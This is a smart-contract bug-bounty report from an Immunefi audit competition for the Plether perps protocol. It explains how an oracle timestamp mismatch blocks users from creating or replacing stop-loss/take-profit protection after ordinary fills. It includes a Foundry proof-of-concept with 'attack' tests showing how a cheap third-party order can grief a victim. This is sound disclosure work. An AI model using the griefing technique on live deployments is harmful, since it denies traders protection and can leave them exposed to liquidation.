# \#99680 [SC-Low] Creating or replacing TP/SL protection reverts after any ordinary order fill until a paid live oracle refresh

**Submitted on Nov 14th 2026 at 19:32:21 UTC by @crypt0n1337 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99680
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

## Summary
The MED-28 remediation (split across post-audit PRs #120 and #124, never externally audited) guards protection operations with `_freshProtectionObservation` (`PositionProtectionBook.sol:862-886`). It calls `oracle.getLatestPrice(MarkRefresh)` (:880), which builds from the **accepted live basket** under `enforcePublishOrder=true` and reverts `PletherOracle__PriceOutOfOrder` whenever `acceptedBasket.publishTime < engine.lastMarkTime()` (`PletherOracle.sol:892-896`); and `_acceptedMarkInstalled` (:888-895) reverts `OracleMarkAhead` in the opposite case. **Only exact equality `accepted == engine` passes.**

But any ordinary order execution advances **only** the engine mark: `_updateEngineMark` (`OrderRouterExecutionSidecar.sol:1053-1061`) calls `engine.updateMarkPrice(price, result.publishTime)` with the historical tick in `(commitTime, commitTime+window]`, while the accepted live basket (`_acceptedBasket`, written only by the live `updateMarkPrice` path) stays behind. So after **any** fill newer than the last live refresh — a trader's own open, or any third party's order — `engine.lastMarkTime() > getAcceptedBasketMark().publishTime`, and `createPositionProtection` / `replacePositionProtection` / `commitOpenOrderWithProtection` all revert until **someone pays for a fresh live `updateMarkPrice`**. A free empty-payload replay (`updateMarkPrice(new bytes[](0))`) also reverts, so only a paid Pyth update heals it.

## Why the audited tests do not catch it
The suite opens positions with the `_open` helper (`test/perps/BasePerpTest.sol:451-476`), which pranks as the router and calls `engine.processOrderTyped` at `block.timestamp` — it never advances the engine through the oracle, so `accepted == engine` always holds in tests. The bug only appears on the **real** `commitOrder` + `executeOrder` path with a historical tick (demonstrated in the PoC via `_openViaRouter`).

## Harm
- A trader who opens a position and then (in a later transaction, as ordinary EOA wallets must) tries to set a stop-loss / take-profit hits `PriceOutOfOrder` and cannot protect the position until they pay for and land a live oracle refresh first — the documented protection surface (`CANONICAL_ENTRYPOINTS.md`) is unavailable after normal order flow.
- **Griefing escalation**: because the trigger is any ordinary fill, a third party with a position of just `minOpenNotionalAssets` (1,000 USDG; the PoC uses 2,000 USDG notional, ~0.4 USDG fee + gas) can commit+execute an order that re-opens the engine/accepted gap immediately after a victim's legitimate refresh, repeatably denying the victim the ability to create or adjust a stop-loss. In a fast market the victim can be liquidated while unable to tighten or set protection.

## Severity
- **Primary — Medium, "Griefing"**: a permissionless, sub-dollar, repeatable action by a third party denies another user a promised risk-management feature, with real adverse-market exposure and no profit motive.
- **Fallback — Low, "Contract fails to deliver promised returns"**: even with no griefer, the protection create/replace surface is unavailable to a trader after their own ordinary fill until a paid refresh.

## Proof of Concept

## Proof of concept
`pocw1/test/ProtectionBricked.t.sol` (inherits the repo `BasePerpTest`; copy to `packages/perps/test/perps/poc/` with import `harn/BasePerpTest.sol`). Release risk params (vpi 0.01e18, maint 10, init 20, FAD 300). Local deployment, MockPyth only. **3/3 pass.**

| Test | Scenario | Result |
|---|---|---|
| `test_attack_ProtectionCreateRevertsAfterHistoricalFill` | t0 aligned (engine==accepted==1709535602); Alice opens via real router → engine 1709535603 > accepted 1709535602 → `createPositionProtection` reverts `PriceOutOfOrder`; free empty `updateMarkPrice([])` also reverts; after a paid refresh+arm, a 3rd-party 2,000-USDG fill → engine 1709535605 > accepted 1709535604 → `replacePositionProtection` reverts | PASS |
| `test_attack_GrieferTinyOrderBricksProtectionCreate` | after a legitimate paid refresh aligns the marks, a griefer's 2,000-USDG fill re-opens the gap → Alice's `createPositionProtection` reverts | PASS |
| `test_control_ProtectionCreateWorksWhenMarksAligned` | same open, but a paid live refresh realigns accepted==engine → `createPositionProtection` succeeds and arms | PASS |

Revert: `PletherOracle__PriceOutOfOrder(uint64,uint64)` (selector `0x8e3e110d`), thrown by `_snapshotFromBasket(enforcePublishOrder=true)`. (`vm.expectPartialRevert` is used because this repo's custom errors carry args and the suite's `expectRevert(bytes4)` idiom only matches zero-arg errors.)

Run: `cd pocw1 && forge test --offline --match-path test/ProtectionBricked.t.sol -vv` → `Suite result: ok. 3 passed; 0 failed; 0 skipped`.

### Test source
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "harn/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @title PoC: TP/SL protection bricks after an ordinary order fill until a paid live oracle refresh
/// @notice Root cause (code-confirmed):
///   - PositionProtectionBook._freshProtectionObservation() (used by createPositionProtection,
///     replacePositionProtection, and commitOpenOrderWithProtection) calls
///     oracle.getLatestPrice(PriceMode.MarkRefresh), which builds from the ACCEPTED live basket and runs
///     PletherOracle._snapshotFromBasket(..., enforcePublishOrder=true). That reverts
///     PletherOracle__PriceOutOfOrder(accepted.publishTime, engine.lastMarkTime()) whenever the accepted
///     basket lags the engine mark.
///   - Any ordinary order execution advances ONLY the engine mark (OrderRouterExecutionSidecar._updateEngineMark
///     -> engine.updateMarkPrice(price, result.publishTime) with the historical tick in (commitTime, commitTime+window]),
///     while the accepted live basket (_acceptedBasket, written only by the live updateMarkPrice path) stays behind.
///   So after a trader own open -- or ANY third party fill -- executes through the real router with historical
///   Pyth data newer than the last live refresh, engine.lastMarkTime() > getAcceptedBasketMark().publishTime, and
///   creating/replacing protection reverts until someone PAYS for a fresh live oracle update. A free empty-payload
///   replay (updateMarkPrice(new bytes[](0))) cannot fix it.
///
/// @dev Release risk parameters (vpi 0.01e18, maint 10 bps, init 20 bps, FAD 300 bps). Local deployment, MockPyth only.
contract ProtectionBrickedPoC is BasePerpTest {
    address internal constant ALICE = address(0xA11CE);
    address internal constant GRIEFER = address(0xBAD);

    uint256 internal constant MARK = 1e8; // 100,000,000 (8 dp)
    uint256 internal constant SIZE = 10_000e18; // 10,000 units -> 10,000 USDG notional at 1.00
    uint256 internal constant MARGIN = 2000e6; // 2,000 USDG

    // This protocol LONG geometry: take-profit below and stop-loss above the entry mark (see spec constants).
    uint256 internal constant LONG_TAKE_PROFIT = 90_000_000;
    uint256 internal constant LONG_STOP_LOSS = 110_000_000;

    // A griefer only needs a position at/above minOpenNotional (1,000 USDG); 2,000 USDG notional here.
    uint256 internal constant GRIEF_SIZE = 2000e18;
    uint256 internal constant GRIEF_MARGIN = 500e6;

    IPositionProtectionActions internal actions;
    IPositionProtectionViews internal views;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        actions = IPositionProtectionActions(address(router.positionProtectionBook()));
        views = IPositionProtectionViews(address(router.positionProtectionBook()));
        _fundTrader(ALICE, 20_000e6);
        _fundTrader(GRIEFER, 20_000e6);
        _refreshMark(MARK);
    }

    // ------------------------------------------------------------------ helpers (mirror repo PositionProtection.t.sol)

    function _livePriceData(
        uint256 price
    ) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] =
                MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, block.timestamp, previous));
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    /// @dev A PAID live refresh: advances BOTH the accepted basket and the engine mark to block.timestamp.
    function _refreshMark(
        uint256 price
    ) internal {
        if (block.timestamp <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        router.updateMarkPrice(_livePriceData(price));
    }

    function _params(
        uint256 takeProfit,
        uint256 stopLoss
    ) internal pure returns (PositionProtectionTypes.PositionProtectionParams memory params) {
        params.takeProfitTriggerPrice = takeProfit;
        params.stopLossTriggerPrice = stopLoss;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _acceptedTime() internal view returns (uint64 publishTime) {
        (,, publishTime) = pletherOracle.getAcceptedBasketMark();
    }

    /// @dev Drives the REAL delayed-order path: public commit, then permissionless execute with historical
    ///      Pyth data whose newest component time is commitTime+1 (strictly after the last live refresh).
    ///      The fill advances engine.lastMarkTime() to that tick; the accepted live basket is NOT touched.
    function _openViaRouter(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 targetPrice
    ) internal returns (uint64 orderId) {
        // targetPrice 0 lets the harness translate to the correct per-side unbounded slippage sentinel
        // (LONG open -> 1 price floor, SHORT open -> uint max price ceiling; this protocol's LONG settles inversely).
        vm.prank(account);
        orderId = router.commitOrder(side, size, margin, targetPrice, false);
        bytes[] memory execData = _mockPythUpdateData(MARK);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(orderId, execData);
        emit log_named_uint("open r.status", uint8(r.status));
        emit log_named_uint("open r.terminalReason", uint8(r.terminalReason));
        emit log_named_uint("open r.pendingReason", uint8(r.pendingReason));
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "router open must fill");
    }

    function _status(
        uint64 protectionId
    ) internal view returns (PositionProtectionTypes.PositionProtectionStatus) {
        return views.getPositionProtection(protectionId).status;
    }

    // ------------------------------------------------------------------ attack

    /// @notice After Alice opens through the real router, her own historical fill leaves the engine mark ahead of the
    ///         accepted basket, so createPositionProtection reverts; a free empty replay cannot fix it; and once she
    ///         does pay for a refresh and arm, ANY third-party fill bricks replacePositionProtection the same way.
    function test_attack_ProtectionCreateRevertsAfterHistoricalFill() public {
        _refreshMark(MARK);
        emit log_named_uint("t0 engine.lastMarkTime", engine.lastMarkTime());
        emit log_named_uint("t0 accepted.publishTime", _acceptedTime());

        _openViaRouter(ALICE, CfdTypes.Side.LONG, SIZE, MARGIN, 0);
        (uint256 aliceSize,,,,,,) = engine.positions(ALICE);
        assertEq(aliceSize, SIZE, "Alice LONG opened via the real router");

        uint64 engTime = engine.lastMarkTime();
        uint64 accTime = _acceptedTime();
        emit log_named_uint("after open engine.lastMarkTime", engTime);
        emit log_named_uint("after open accepted.publishTime", accTime);
        assertGt(engTime, accTime, "the open own fill leaves engine mark ahead of the accepted basket");

        // (1) create protection bricks: getLatestPrice(MarkRefresh) -> accepted basket (behind) -> PriceOutOfOrder.
        vm.prank(ALICE);
        vm.expectPartialRevert(IPletherOracle.PletherOracle__PriceOutOfOrder.selector);
        actions.createPositionProtection(_params(LONG_TAKE_PROFIT, LONG_STOP_LOSS));

        // (2) a FREE empty-payload replay cannot heal it; only a PAID live refresh advances the accepted basket.
        vm.expectPartialRevert(IPletherOracle.PletherOracle__PriceOutOfOrder.selector);
        router.updateMarkPrice(new bytes[](0));

        // --- replace path: pay to realign, arm, then let any third party re-open the gap ---
        _refreshMark(MARK);
        assertEq(_acceptedTime(), engine.lastMarkTime(), "paid live refresh re-aligns accepted == engine");

        vm.prank(ALICE);
        uint64 pid = actions.createPositionProtection(_params(LONG_TAKE_PROFIT, LONG_STOP_LOSS));
        assertEq(
            uint8(_status(pid)),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Armed),
            "protection arms once marks are aligned"
        );

        // A third party ordinary fill (no attacker privilege) re-opens the engine/accepted gap.
        _openViaRouter(GRIEFER, CfdTypes.Side.SHORT, GRIEF_SIZE, GRIEF_MARGIN, 0);
        emit log_named_uint("after 3rd-party fill engine.lastMarkTime", engine.lastMarkTime());
        emit log_named_uint("after 3rd-party fill accepted.publishTime", _acceptedTime());
        assertGt(engine.lastMarkTime(), _acceptedTime(), "third-party fill re-opens the gap");

        // (3) replacing the already-armed protection now reverts the same way.
        vm.prank(ALICE);
        vm.expectPartialRevert(IPletherOracle.PletherOracle__PriceOutOfOrder.selector);
        actions.replacePositionProtection(pid, _params(LONG_TAKE_PROFIT - 1_000_000, LONG_STOP_LOSS + 1_000_000));
    }

    /// @notice A tiny griefer order (>= minOpenNotional) front-running Alice protection tx bricks her create, even
    ///         immediately after a legitimate paid refresh -- a sub-dollar, permissionless, repeatable denial.
    function test_attack_GrieferTinyOrderBricksProtectionCreate() public {
        _refreshMark(MARK);
        _openViaRouter(ALICE, CfdTypes.Side.LONG, SIZE, MARGIN, 0);

        // A legitimate live refresh re-aligns the marks right before Alice tries to protect.
        _refreshMark(MARK);
        assertEq(_acceptedTime(), engine.lastMarkTime(), "aligned immediately before the griefer acts");

        // Griefer front-runs with a tiny ordinary order; its fill advances only the engine mark.
        _openViaRouter(GRIEFER, CfdTypes.Side.SHORT, GRIEF_SIZE, GRIEF_MARGIN, 0);
        emit log_named_uint("griefer notional (USDG)", (GRIEF_SIZE * MARK) / 1e20);
        assertGt(engine.lastMarkTime(), _acceptedTime(), "tiny griefer fill re-opens the gap");

        vm.prank(ALICE);
        vm.expectPartialRevert(IPletherOracle.PletherOracle__PriceOutOfOrder.selector);
        actions.createPositionProtection(_params(LONG_TAKE_PROFIT, LONG_STOP_LOSS));
    }

    // ------------------------------------------------------------------ control

    /// @notice The same open leaves the engine mark ahead of the accepted basket, but after a PAID live refresh
    ///         re-aligns accepted == engine, createPositionProtection succeeds and arms. This isolates the revert to
    ///         the accepted-vs-engine ordering, not to any invalid parameters or missing position.
    function test_control_ProtectionCreateWorksWhenMarksAligned() public {
        _refreshMark(MARK);
        _openViaRouter(ALICE, CfdTypes.Side.LONG, SIZE, MARGIN, 0);
        assertGt(engine.lastMarkTime(), _acceptedTime(), "open leaves engine ahead of accepted (same root cause)");

        _refreshMark(MARK);
        assertEq(_acceptedTime(), engine.lastMarkTime(), "paid live refresh aligns the marks");

        vm.prank(ALICE);
        uint64 pid = actions.createPositionProtection(_params(LONG_TAKE_PROFIT, LONG_STOP_LOSS));
        assertGt(pid, 0, "protection created when marks are aligned");
        assertEq(
            uint8(_status(pid)),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Armed),
            "protection armed when marks are aligned"
        );
    }
}

```
